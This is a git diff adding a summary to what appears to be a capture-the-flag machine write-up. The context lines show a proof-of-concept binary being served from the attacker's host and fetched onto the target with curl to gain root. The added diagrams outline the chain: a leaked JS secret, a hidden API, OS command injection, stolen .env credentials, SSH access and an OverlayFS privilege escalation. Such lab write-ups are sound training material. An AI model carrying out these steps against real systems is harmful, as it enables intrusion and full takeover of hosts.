@@ -408,3 +408,26 @@ sudo docker cp <container-ID>:/tmp/poc .
 I can then get this `poc` binary onto the target by serving it via `python3 -m http.server 1337` and downloading it via `curl -O http://<my-ip>:1337/poc`
 
 After making this `poc` binary executable and executing it, the `admin` user becomes `root`!
+
+### Summary
+
+Below is a visualized summary of the exploitation steps used in this machine to gain RCE.
+
+``` mermaid
+graph LR
+  A[HTTP<br>Service] -->|JS<br>secret<br>leak| B[Account<br>creation]
+  B -->|find| C[Hidden<br>API];
+  B -->|Elevate<br>privileges| C[Hidden<br>API];
+  C -->|OS-Command<br>injection| D[OS-Command<br>Execution];
+
+  E[OS-Command<br>Execution] -->|Read| F[.env file];
+  F -->|Use<br>credentials| G[SSH<br>access];
+```
+
+The privilege escalation to the user `root` worked as follows:
+
+``` mermaid
+graph LR
+  A[SSH<br>access] -->|Enumerate<br>Kernel-version| B[vulnerable<br>OverlayFS];
+  B -->|Insecure<br>File-copy| C[Command<br>execution<br>as root];
+```
